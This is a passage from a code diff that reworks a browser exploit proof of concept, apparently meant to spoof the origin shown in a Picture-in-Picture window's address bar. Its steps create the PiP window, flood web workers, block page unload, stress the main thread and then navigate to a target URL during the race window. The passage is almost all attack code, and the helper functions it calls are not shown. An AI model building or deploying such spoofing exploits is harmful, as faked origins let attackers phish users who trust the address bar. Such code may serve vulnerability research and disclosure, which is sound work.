+    const navDelay = parseInt(document.getElementById('navDelay').value);
+    const blockDuration = parseInt(document.getElementById('blockDuration').value);
+
+    log('i', '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
+    log('i', `Strategy: ${['A','B','C','D'][currentStrategy-1]} | Target: ${targetUrl}`);
+    log('i', `Workers: ${workerCount} | Nav Delay: ${navDelay}ms | Block: ${blockDuration}ms`);
+    log('i', '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
+
+    // ─── STEP 1: Create PiP (requires this user gesture) ───
+    log('i', 'Step 1: Creating PiP window...');
+    const pipOk = await createPiP();
+    if (!pipOk) {
+        btn.disabled = false;
+        btn.textContent = '▶ Launch PoC';
+        return;
+    }
+
+    // ─── STEP 2: Setup race condition components ───
+    log('i', 'Step 2: Setting up race condition...');
+
+    // Always setup unload blocking (all strategies benefit)
+    setupUnloadBlocking(blockDuration);
+
+    // Worker flooding (all strategies)
+    floodWorkers(workerCount);
+
+    // Main thread stress
+    mainThreadStress();
+
+    // Strategy-specific setup
+    let reRequestInterval = null;
+    if (currentStrategy === 2 || currentStrategy === 4) {
+        reRequestInterval = setupReRequestFlood();
+    }
+
+    // ─── STEP 3: Wait then navigate ───
+    log('i', `Step 3: Waiting ${navDelay}ms before navigation...`);
+    log('w', `⚠️ PiP akan menampilkan spoofed origin selama race window`);
+    log('i', `Watch the PiP address bar closely!`);
+
+    setTimeout(() => {
+        log('w', `🔥 NAVIGATING TO: ${targetUrl}`);
+
+        if (currentStrategy === 3) {
+            // Strategy C: Navigation abort attack
+            attemptNavigationAbort(targetUrl);
+        } else {
+            // Strategy A, B, D: Direct navigation with race condition
+            // The unload blocking + workers should extend the race window
+            window.location.href = targetUrl;
         }
+    }, navDelay);
+}
+</script>
 
-        // ============================================================
-        // MAIN TRIGGER
-        // ============================================================
-        async function triggerPoC() {
-            log('info', '━━━━━━━━━━━━━━━━━━━━━━━━━━━');
-            log('info', `Launching PoC with Strategy ${selectedStrategy}`);
-
-            // Step 1: Create PiP window (requires user gesture — this click!)
-            const pip = await createPiPWindow();
-            if (!pip) {
-                log('error', 'Cannot proceed without PiP window');
-                return;
-            }
-
-            // Step 2: Execute selected strategy
-            switch (selectedStrategy) {
-                case 1: strategy1_windowOpen(); break;
-                case 2: strategy2_iframeOverlay(); break;
-                case 3: strategy3_fetchRewrite(); break;
-                case 4: strategy4_combined(); break;
-            }
-        }
-    </script>
 </body>
 </html>
